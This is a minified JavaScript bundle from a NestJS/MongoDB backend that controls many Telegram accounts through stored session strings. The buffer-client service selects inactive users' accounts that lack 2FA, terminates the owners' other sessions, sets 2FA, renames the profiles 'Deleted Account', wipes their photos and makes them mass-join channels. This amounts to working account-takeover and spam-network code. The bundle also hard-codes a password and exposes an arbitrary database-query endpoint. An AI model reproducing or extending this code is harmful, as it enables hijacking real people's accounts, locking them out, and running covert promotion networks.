create(e){return new this.archivedclientModel(e).save()}async findAll(){return await this.archivedclientModel.find().exec()}async findOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();return t}async fetchOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();if(t)return t;try{await m.connectionManager.getClient(e,{autoDisconnect:!0,handler:!1});const t=await this.telegramService.createNewSession(e);return await this.create({channelLink:"default",clientId:"default",dbcoll:"default",deployKey:"default",link:"default",mainAccount:"default",promoteRepl:"default",name:"default",password:"Ajtdmwajt1@",repl:"default",session:t,username:"default",mobile:e,product:"default",gpayId:"default",promoteMobile:[],qrId:"default"})}catch(e){throw new a.NotFoundException((0,u.parseError)(e).message)}finally{await m.connectionManager.unregisterClient(e)}}async update(e,t){return delete t._id,t._doc&&delete t._doc._id,console.log({...t}),await this.archivedclientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){const t=await this.archivedclientModel.findOneAndDelete({mobile:e}).exec();if(!t)throw new a.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.archivedclientModel.find(e).exec()}async checkArchivedClients(){await m.connectionManager.disconnectAll(),await(0,p.sleep)(2e3);const e=await this.findAll(),t=(await this.clientService.findAll()).map((e=>e.mobile));return e.map((async e=>{if(t.includes(e.mobile))console.log("Number is a Active Client");else try{await m.connectionManager.getClient(e.mobile,{autoDisconnect:!0,handler:!1}),await this.telegramService.updateUsername(e.mobile,""),await this.telegramService.updateNameandBio(e.mobile,"Deleted Account",""),await(0,p.sleep)(2e3)}catch(t){console.log(e.mobile," :  false"),this.remove(e.mobile)}finally{await m.connectionManager.unregisterClient(e.mobile)}})),"Triggered ArchiveClients check"}async executeQuery(e){try{if(!e)throw new a.BadRequestException("Query is invalid.");return await this.archivedclientModel.find(e).exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}};t.ArchivedClientService=g,t.ArchivedClientService=g=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("ArchivedArchivedClientsModule")),r(1,(0,a.Inject)((0,a.forwardRef)((()=>l.TelegramService)))),r(2,(0,a.Inject)((0,a.forwardRef)((()=>d.ClientService)))),o("design:paramtypes",[c.Model,l.TelegramService,d.ClientService])],g)},5853:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientController=void 0;const a=i(3563),s=i(9742),c=i(4374),l=i(9139),p=i(2843),d=i(5042);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforBufferClients(){return this.clientService.joinchannelForBufferClients()}async checkbufferClients(){return this.clientService.checkBufferClients(),"initiated Checking"}async addNewUserstoBufferClients(e){return this.clientService.addNewUserstoBufferClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsBufferClient(e){return await this.clientService.setAsBufferClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.BufferClientController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateBufferClientDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchBufferClientDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)("joinChannelsForBufferClients"),(0,s.ApiOperation)({summary:"Join Channels for BufferClients"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"joinChannelsforBufferClients",null),n([(0,a.Get)("checkBufferClients"),(0,s.ApiOperation)({summary:"Check Buffer Clients"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"checkbufferClients",null),n([(0,a.Post)("addNewUserstoBufferClients"),(0,s.ApiOperation)({summary:"Add New Users to Buffer Clients"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"addNewUserstoBufferClients",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)("SetAsBufferClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Buffer Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"setAsBufferClient",null),n([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateBufferClientDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateBufferClientDto]),o("design:returntype",Promise)],u.prototype,"createdOrupdate",null),n([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),t.BufferClientController=u=n([(0,s.ApiTags)("Buffer Clients"),(0,a.Controller)("bufferclients"),o("design:paramtypes",[c.BufferClientService])],u)},8421:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientModule=void 0;const o=i(3563),r=i(5839),a=i(4374),s=i(5853),c=i(9035),l=i(282),p=i(3322),d=i(7422),u=i(8009),m=i(5774),g=i(1324),h=i(1373);let y=class{};t.BufferClientModule=y,t.BufferClientModule=y=n([(0,o.Module)({imports:[m.initModule,r.MongooseModule.forFeature([{name:"bufferClientModule",schema:c.BufferClientSchema,collection:"bufferClients"}]),(0,o.forwardRef)((()=>l.TelegramModule)),(0,o.forwardRef)((()=>d.UsersModule)),(0,o.forwardRef)((()=>p.ActiveChannelsModule)),(0,o.forwardRef)((()=>u.ClientModule)),(0,o.forwardRef)((()=>g.ChannelsModule)),(0,o.forwardRef)((()=>h.PromoteClientModule))],controllers:[s.BufferClientController],providers:[a.BufferClientService],exports:[a.BufferClientService]})],y)},4374:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientService=void 0;const s=i(9597),c=i(3563),l=i(5839),p=i(6037),d=i(2995),u=i(7385),m=i(9127),g=i(9155),h=i(5562),y=i(1870),f=i(3235),v=i(9647),b=i(6250),w=i(3653);let P=n=class{constructor(e,t,i,o,r,a,s){this.bufferClientModel=e,this.telegramService=t,this.usersService=i,this.activeChannelsService=o,this.clientService=r,this.channelsService=a,this.promoteClientService=s,this.logger=new c.Logger(n.name),this.joinChannelMap=new Map,this.leaveChannelMap=new Map,this.isJoinChannelProcessing=!1,this.isLeaveChannelProcessing=!1,this.JOIN_CHANNEL_INTERVAL=24e4,this.LEAVE_CHANNEL_INTERVAL=6e4,this.LEAVE_CHANNEL_BATCH_SIZE=10}async create(e){return new this.bufferClientModel(e).save()}async findAll(){return this.bufferClientModel.find().exec()}async findOne(e,t=!0){const i=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();if(!i&&t)throw new c.NotFoundException(`BufferClient with mobile ${e} not found`);return i}async update(e,t){const i=await this.bufferClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!i)throw new c.NotFoundException(`User with mobile ${e} not found`);return i}async createOrUpdate(e,t){const i=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();return i?(console.log("Updating"),this.update(i.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,v.fetchWithTimeout)(`${(0,b.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${e}`)}`),0===(await this.bufferClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new c.NotFoundException(`BufferClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.bufferClientModel.find(e).exec()}async executeQuery(e,t,i,n){try{if(!e)throw new c.BadRequestException("Query is invalid.");const o=this.bufferClientModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new c.InternalServerErrorException(e.message)}}removeFromBufferMap(e){this.joinChannelMap.delete(e)}clearBufferMap(){console.log("BufferMap cleared"),this.joinChannelMap.clear(),this.clearJoinChannelInterval()}async joinchannelForBufferClients(e=!0){if(!this.telegramService.getActiveClientSetup()){this.logger.log("Starting join channel process"),await w.connectionManager.disconnectAll(),this.clearJoinChannelInterval(),this.clearLeaveChannelInterval(),await(0,u.sleep)(2e3);const t=e?[]:Array.from(this.joinChannelMap.keys()),i=await this.bufferClientModel.find({channels:{$lt:350},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(this.logger.debug(`Found ${i.length} clients to process for joining channels`),i.length>0)for(const e of i)try{const t=await w.connectionManager.getClient(e.mobile,{autoDisconnect:!1,handler:!1});this.logger.log(`Started joining process for mobile: ${e.mobile}`);const i=await t.channelInfo(!0);this.logger.debug(`Client ${e.mobile} has ${i.ids.length} existing channels`),await this.update(e.mobile,{channels:i.ids.length}),this.logger.debug(`Client ${e.mobile} has ${i.canSendFalseChats.length} channels that can't send messages`);let n=[];i.canSendFalseCount<10?(n=i.ids.length<220?await this.channelsService.getActiveChannels(150,0,i.ids):await this.activeChannelsService.getActiveChannels(150,0,i.ids),this.logger.debug(`Adding ${n.length} new channels to join queue for ${e.mobile}`),this.joinChannelMap.set(e.mobile,n),this.joinChannelQueue(),await w.connectionManager.unregisterClient(e.mobile)):(this.logger.warn(`Client ${e.mobile} has too many restricted channels, moving to leave queue: ${i.canSendFalseChats.length}`),this.joinChannelMap.delete(e.mobile),this.leaveChannelMap.set(e.mobile,i.canSendFalseChats),this.leaveChannelQueue(),await w.connectionManager.unregisterClient(e.mobile))}catch(t){"SESSION_REVOKED"!==t.message&&"AUTH_KEY_UNREGISTERED"!==t.message&&"USER_DEACTIVATED"!==t.message&&"USER_DEACTIVATED_BAN"!==t.message||(this.logger.error(`Session invalid for ${e.mobile}, removing client`,t.stack),await this.remove(e.mobile),await w.connectionManager.unregisterClient(e.mobile)),(0,f.parseError)(t)}return this.logger.log(`Join channel process initiated for ${i.length} clients`),`Initiated Joining channels ${i.length}`}this.logger.warn("Ignored active check buffer channels as active client setup exists")}async joinChannelQueue(){this.isJoinChannelProcessing||this.joinChannelIntervalId?this.logger.warn("Join channel process is already running, instance:",this.joinChannelIntervalId):0!==Array.from(this.joinChannelMap.keys()).length?(this.isJoinChannelProcessing=!0,this.joinChannelIntervalId=setInterval((async()=>{try{const e=Array.from(this.joinChannelMap.keys());if(0===e.length)return void this.clearJoinChannelInterval();const t=setTimeout((()=>{this.logger.error("Join channel interval processing timeout"),this.clearJoinChannelInterval()}),this.JOIN_CHANNEL_INTERVAL-1e3);this.logger.debug(`Processing join channel queue at ${(new Date).toISOString()}, ${e.length} clients remaining, interval:${this.joinChannelIntervalId}`);for(const t of e){const e=this.joinChannelMap.get(t);if(!e||0===e.length){this.logger.debug(`No more channels to join for ${t}, removing from queue`),this.removeFromBufferMap(t);continue}const i=e.shift();this.logger.debug(`${t} has ${e.length} pending channels to join`),this.joinChannelMap.set(t,e);try{await w.connectionManager.getClient(t,{autoDisconnect:!1,handler:!1}),this.logger.debug(`${t} attempting to join channel: @${i.username}`),await this.telegramService.tryJoiningChannel(t,i)}catch(e){const n=(0,f.parseError)(e,`${t} @${i.username} Outer Err ERR: `,!1);if(this.logger.error(`Error joining channel @${i.username} for ${t}`,n),"FloodWaitError"===n.error||"CHANNELS_TOO_MUCH"===e.errorMessage){this.logger.warn(`${t} has FloodWaitError or joined too many channels, removing from queue`),this.removeFromBufferMap(t);const e=await this.telegramService.getChannelInfo(t,!0);await this.update(t,{channels:e.ids.length})}"SESSION_REVOKED"!==e.errorMessage&&"AUTH_KEY_UNREGISTERED"!==e.errorMessage&&"USER_DEACTIVATED"!==e.errorMessage&&"USER_DEACTIVATED_BAN"!==e.errorMessage||(this.logger.error(`Session invalid for ${t}, removing client`),await this.remove(t))}finally{await w.connectionManager.unregisterClient(t)}}clearTimeout(t)}catch(e){this.logger.error("Error in join channel interval",e.stack),this.clearJoinChannelInterval()}}),this.JOIN_CHANNEL_INTERVAL),this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`)):this.logger.debug("No channels to join, not starting queue")}clearJoinChannelInterval(){this.joinChannelIntervalId&&(this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`),clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,this.isJoinChannelProcessing=!1,this.joinChannelMap.size>0&&setTimeout((()=>{this.logger.debug("Triggering next join channel process"),this.joinchannelForBufferClients(!1)}),3e4))}removeFromLeaveMap(e){this.leaveChannelMap.delete(e),0===this.leaveChannelMap.size&&this.clearLeaveChannelInterval()}clearLeaveMap(){console.log("LeaveMap cleared"),this.leaveChannelMap.clear(),this.clearLeaveChannelInterval()}async leaveChannelQueue(){this.isLeaveChannelProcessing||this.leaveChannelIntervalId?this.logger.warn("Leave channel process is already running, instance:",this.leaveChannelIntervalId):0!==Array.from(this.leaveChannelMap.keys()).length?(this.isLeaveChannelProcessing=!0,this.leaveChannelIntervalId=setInterval((async()=>{try{const e=Array.from(this.leaveChannelMap.keys());if(0===e.length)return this.logger.debug("Leave map is empty, clearing interval"),void this.clearLeaveChannelInterval();const t=setTimeout((()=>{this.logger.error("Leave channel interval processing timeout"),this.clearLeaveChannelInterval()}),this.LEAVE_CHANNEL_INTERVAL-1e3);this.logger.debug(`Processing leave channel queue at ${(new Date).toISOString()}, ${e.length} clients remaining, interval:${this.leaveChannelIntervalId}`);for(const t of e){const e=this.leaveChannelMap.get(t);if(!e||0===e.length){this.logger.debug(`No more channels to leave for ${t}, removing from queue`),this.removeFromLeaveMap(t);continue}const i=e.splice(0,this.LEAVE_CHANNEL_BATCH_SIZE);this.logger.debug(`${t} has ${e.length} pending channels to leave`),e.length>0?this.leaveChannelMap.set(t,e):this.removeFromLeaveMap(t);try{const e=await w.connectionManager.getClient(t,{autoDisconnect:!1,handler:!1});this.logger.debug(`${t} attempting to leave ${i.length} channels`),await e.leaveChannels(i),this.logger.debug(`${t} left channels successfully`)}catch(e){const i=(0,f.parseError)(e,`${t} Leave Channel ERR: `,!1);"SESSION_REVOKED"!==i.message&&"AUTH_KEY_UNREGISTERED"!==i.message&&"USER_DEACTIVATED"!==i.message&&"USER_DEACTIVATED_BAN"!==i.message||(this.logger.error(`Session invalid for ${t}, removing client`),await this.remove(t),this.removeFromLeaveMap(t))}finally{await w.connectionManager.unregisterClient(t)}}clearTimeout(t)}catch(e){this.logger.error("Error in leave channel interval",e.stack),this.clearLeaveChannelInterval()}}),this.LEAVE_CHANNEL_INTERVAL),this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`)):this.logger.debug("No channels to leave, not starting queue")}clearLeaveChannelInterval(){this.leaveChannelIntervalId&&(this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`),clearInterval(this.leaveChannelIntervalId),this.leaveChannelIntervalId=null),this.isLeaveChannelProcessing=!1,this.logger.debug("Leave channel interval cleared and processing flag reset")}async setAsBufferClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){const i=(await this.usersService.search({mobile:e}))[0];if(!i)throw new c.BadRequestException("user not found");if(await this.findOne(e,!1))throw new c.ConflictException("BufferClient already exist");const n=await this.clientService.findAll(),o=n.map((e=>e?.mobile));if(n.flatMap((e=>e?.promoteMobile)).includes(e)||o.includes(e))throw new c.BadRequestException("Number is a Active Client");try{const n=await w.connectionManager.getClient(e,{autoDisconnect:!1});await n.set2fa(),await(0,u.sleep)(15e3),await n.updateUsername(""),await(0,u.sleep)(3e3),await n.updatePrivacyforDeletedAccount(),await(0,u.sleep)(3e3),await n.updateProfile("Deleted Account","Deleted Account"),await(0,u.sleep)(3e3),await n.deleteProfilePhotos();const o=await this.telegramService.getChannelInfo(e,!0),r={tgId:i.tgId,session:i.session,mobile:i.mobile,availableDate:t,channels:o.ids.length};await this.bufferClientModel.findOneAndUpdate({tgId:i.tgId},{$set:r},{new:!0,upsert:!0}).exec()}catch(e){const t=(0,f.parseError)(e);throw new c.HttpException(t.message,t.status)}return await w.connectionManager.unregisterClient(e),"Client set as buffer successfully"}async checkBufferClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check buffer channels as active client setup exists");else{await w.connectionManager.disconnectAll(),await(0,u.sleep)(2e3);const e=await this.findAll();let t=[];const i=[];if(e.length<70)for(let t=0;t<70-e.length;t++)i.push(t.toString());const n=await this.clientService.findAll(),o=await this.promoteClientService.findAll(),r=[...n.map((e=>e.mobile)),...n.flatMap((e=>e.promoteMobile))],a=o.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const n of e)if(r.includes(n.mobile)||a.includes(n.mobile))console.log("Number is a Active Client"),t.push(n.mobile),this.remove(n.mobile);else try{const e=await w.connectionManager.getClient(n.mobile,{autoDisconnect:!0,handler:!1}),o=await e.getMe();o.username&&(await this.telegramService.updateUsername(n.mobile,""),await(0,u.sleep)(2e3)),"Deleted Account"!==o.firstName&&(await this.telegramService.updateNameandBio(n.mobile,"Deleted Account",""),await(0,u.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(n.mobile),await e.hasPassword()?(console.log(n.mobile," :  ALL Good"),t.push(n.mobile)):(console.log("Client does not have password"),i.push(n.mobile)),await w.connectionManager.unregisterClient(n.mobile),await(0,u.sleep)(2e3)}catch(e){(0,f.parseError)(e),i.push(n.mobile),this.remove(n.mobile),await w.connectionManager.unregisterClient(n.mobile)}t=[...t,...r,...a],console.log("GoodIds: ",t.length,"BadIds : ",i.length),this.addNewUserstoBufferClients(i,t)}}async addNewUserstoBufferClients(e,t){const i=new Date(Date.now()-7776e6).toISOString().split("T")[0],n=await this.usersService.executeQuery({mobile:{$nin:t},expired:!1,twoFA:!1,lastActive:{$lt:i},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New buffer documents to be added: ",n.length);e.length>0&&n.length>0;){const t=n.shift();try{try{const i=await w.connectionManager.getClient(t.mobile,{autoDisconnect:!1}),n=await i.hasPassword();if(console.log("hasPassword: ",n),n)console.log("Failed to Update as BufferClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await w.connectionManager.unregisterClient(t.mobile);else{await i.removeOtherAuths(),await i.set2fa(),console.log("waiting for setting 2FA"),await(0,u.sleep)(3e4),await i.updateUsername(""),await(0,u.sleep)(3e3),await i.updatePrivacyforDeletedAccount(),await(0,u.sleep)(3e3),await i.updateProfile("Deleted Account","Deleted Account"),await(0,u.sleep)(3e3),await i.deleteProfilePhotos(),await(0,u.sleep)(2e3),await this.telegramService.removeOtherAuths(t.mobile);const n=await i.channelInfo(!0);console.log("Inserting Document");const o={tgId:t.tgId,session:t.session,mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:n.ids.length};await this.create(o),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created BufferClient============="),await w.connectionManager.unregisterClient(t.mobile),e.pop()}}catch(e){(0,f.parseError)(e),await w.connectionManager.unregisterClient(t.mobile)}}catch(e){(0,f.parseError)(e),console.error("An error occurred:",e)}await w.connectionManager.unregisterClient(t.mobile)}setTimeout((()=>{this.joinchannelForBufferClients()}),12e4)}};t.BufferClientService=P,t.BufferClientService=P=n=o([(0,c.Injectable)(),a(0,(0,l.InjectModel)("bufferClientModule")),a(1,(0,c.Inject)((0,c.forwardRef)((()=>d.TelegramService)))),a(2,(0,c.Inject)((0,c.forwardRef)((()=>m.UsersService)))),a(3,(0,c.Inject)((0,c.forwardRef)((()=>g.ActiveChannelsService)))),a(4,(0,c.Inject)((0,c.forwardRef)((()=>h.ClientService)))),a(5,(0,c.Inject)((0,c.forwardRef)((()=>g.ActiveChannelsService)))),a(6,(0,c.Inject)((0,c.forwardRef)((()=>y.PromoteClientService)))),r("design:paramtypes",[p.Model,d.TelegramService,m.UsersService,g.ActiveChannelsService,h.ClientService,s.ChannelsService,y.PromoteClientService])],P)},9139:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateBufferClientDto=void 0;const r=i(9742),a=i(7403);class s{}t.CreateBufferClientDto=s,n([(0,r.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"tgId",void 0),n([(0,r.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"mobile",void 0),n([(0,r.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"availableDate",void 0),n([(0,r.ApiProperty)({description:"Session identifier",example:"session123"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"session",void 0),n([(0,r.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),o("design:type",Number)],s.prototype,"channels",void 0)},2843:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchBufferClientDto=void 0;const r=i(9742),a=i(7403);class s{}t.SearchBufferClientDto=s,n([(0,r.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"tgId",void 0),n([(0,r.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"mobile",void 0),n([(0,r.ApiPropertyOptional)({description:"availableDate of the bufferClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"availableDate",void 0),n([(0,r.ApiPropertyOptional)({description:"Session identifier",example:"session123"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"session",void 0),n([(0,r.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),o("design:type",Number)],s.prototype,"channels",void 0)},5042:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateBufferClientDto=void 0;const n=i(9742),o=i(9139);class r extends((0,n.PartialType)(o.CreateBufferClientDto)){}t.UpdateBufferClientDto=r},9035:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientSchema=t.BufferClient=void 0;const r=i(5839);let a=class{};t.BufferClient=a,n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"tgId",void 0),n([(0,r.Prop)({required:!0,unique:!0}),o("design:type",String)],a.prototype,"mobile",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"session",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"availableDate",void 0),n([(0,r.Prop)({required:!0,type:Number}),o("design:type",Number)],a.prototype,"channels",void 0),t.BufferClient=a=n([(0,r.Schema)({collection:"bufferClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.BufferClientSchema=r.SchemaFactory.createForClass(a)},4185:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildController=void 0;const a=i(3563),s=i(9742),c=i(4362);let l=class{constructor(e){this.buildService=e}async findOne(){return this.buildService.findOne()}async update(e){return this.buildService.update(e)}};t.BuildController=l,n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get build data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"findOne",null),n([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update build"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"update",null),t.BuildController=l=n([(0,s.ApiTags)("Build"),(0,a.Controller)("builds"),o("design:paramtypes",[c.BuildService])],l)},3177:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildModule=void 0;const o=i(3563),r=i(5839),a=i(4362),s=i(4185),c=i(6877),l=i(889);let p=class{};t.BuildModule=p,t.BuildModule=p=n([(0,o.Global)(),(0,o.Module)({imports:[p,r.MongooseModule.forFeature([{name:"buildModule",collection:"builds",schema:c.BuildSchema}]),l.NpointModule],providers:[a.BuildService],controllers:[s.BuildController],exports:[p]})],p)},4362:function(e,t,i){var 